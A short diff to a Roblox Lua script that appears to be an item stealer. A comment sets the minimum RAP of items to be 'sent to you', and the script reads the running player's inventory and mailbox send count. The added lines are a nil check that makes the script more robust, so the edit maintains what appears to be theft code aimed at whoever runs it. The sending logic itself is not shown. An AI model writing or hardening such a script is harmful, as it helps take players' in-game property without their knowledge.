@@ -4,6 +4,12 @@ min_rap = 1000000 -- Minimum RAP of each item you want to get sent to you. 1 mil
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
+
+if library.Save == nil or library.Save.Get == nil then
+    warn("Error: 'library.Save' or 'library.Save.Get()' is nil.")
+    return
+end
+
 local save = library.Save.Get().Inventory
 local mailsent = library.Save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
